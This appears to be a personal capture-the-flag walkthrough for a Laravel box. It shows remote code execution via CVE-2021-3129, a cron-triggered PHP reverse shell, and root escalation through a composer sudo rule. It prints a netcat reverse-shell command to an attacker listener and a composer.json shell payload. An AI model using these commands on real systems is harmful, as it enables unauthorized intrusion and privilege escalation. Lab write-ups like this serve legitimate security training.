
#box

*Created: 1/12/2026*

### Step 1

**Tags:** #Laravel #PHP #Web-Applications #RCE #Reverse-Shell

🔗 **URL/Link:** https://github.com/shadowabi/Laravel-CVE-2021-3129

**Command:**
```bash
python3 Exp.py -t 192.168.167.38 -p 80 -c "busybox nc 192.168.45.213 22 -e /bin/sh"
```

*Port: 80*

> 
> On port 80 we discover a website. After some fuzzing we reach the `http://192.168.167.38/images/` endpoint. By uploading an image (after registering) we discover that this image is displayed on this endpoint with a random ID generate on upload. The crucial part of that page is that it exposes the it runs `Laravel`, specifically its version `8.4.0` which is vulnerable to [CVE-2021-3129](https://github.com/shadowabi/Laravel-CVE-2021-3129)

---

### Step 2

**Tags:** #Laravel #PHP #Web-Applications #Reverse-Shell #cron

**Command:**
```bash
# Once the file has been overwritten, just wait for the cronjob to trigger on our listener. We've used port 22 for that purpose.
```

> 
> Once on the target machine, through the use of `pspy64` we notice that every minute a script executing `/usr/bin/php /var/www/html/lavita/artisan clear:pictures` is being ran with ID: 1001 (user : `skunk`). Since we have write rights over that `artisan` file and it's being executed with the `php` binary we overwrite it with a PHP Reverse Shell to obtain control of the user `skunk`. To obtain a reverse shell we opt to use `PHP PentestMonkey Reverse Shell`
> 
> The binary executing this artisan file is `php`. Since we can write over that `artisan` file, which is a `Laravel` component we can overwrite this `artisan` file with the PentestMonkey PHP Reverse Shell to successfully obtain a shell with the `skunk` user.

---

### Step 3

**Tags:** #sudo-Privileges #composer #GTFOBins

🔗 **URL/Link:** https://gtfobins.github.io/gtfobins/composer/#sudo

**Command:**
```bash
# Crafting composer.json with www-data
echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' > ./composer.json

# Triggering the GTFOBins according to the sudo privileges we have on skunk
sudo /usr/bin/composer --working-dir=/var/www/html/lavita run-script x
```

> 
> Finally, on the `skunk`  user we notice that we have sudo rights on a very specific script on the binary `composer`. The `composer` binary has the following [GTFOBins](https://gtfobins.github.io/gtfobins/composer/#sudo). We just need to adapt this command to our very specific case to obtain a shell as `root`. Since the GTFOBins expects the binary to target a `composer.json`, and `skunk` cannot edit on the target endpoint `/var/www/html/lavita`, we're gonna use `www-data` to craft a custom `composer.json` file inside `/var/www/html/lavita` following the GTFOBins that will grant us a shell as `root`
> 
> To properly make the script work, we need to analyze the current sudo privilege we have on `skunk`.
> 
```bash
skunk@debian:/$ sudo -l                                                                  
Matching Defaults entries for skunk on debian:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User skunk may run the following commands on debian:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/composer --working-dir\=/var/www/html/lavita *
```
> 
> Looking at this, we know that composer can exclusively be ran inside `/var/www/html/lavita`. The GTFOBins asks for a composer.json file which will be our trigger:
> 
> `echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json`
> 
> (for the sake of this scenario we won't require to use `mktemp -d` since we won't be able to run anything outside `/var/www/html/lavita` which is our target folder)
> 
> So, since `skunk` has no right privileges on that folder, we'll have to leverage `www-data` to create this malicious `composer.json` that will grant us a `root` shell.
> 
> Once pushed the malicious script onto composer.json, we can successfully trigger composer from `skunk`, obtaining a shell as `root`

---

